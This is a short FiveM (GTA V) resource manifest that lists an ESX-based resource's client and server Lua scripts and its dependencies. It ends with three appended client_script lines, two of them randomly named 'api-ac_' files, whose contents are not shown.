fx_version 'cerulean'
games {"gta5"}

lua54 'yes'

client_scripts {
	'@es_extended/locale.lua',
	'config.lua',
	'client.lua',
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
    '@es_extended/locale.lua',
	'config.lua',
	'server.lua',
}
client_script '@sattiva_police_cars/client.lua'
client_script "api-ac_xFAVqqYTZqVi.lua"
client_script "api-ac_FYtpvyOwLOsw.lua"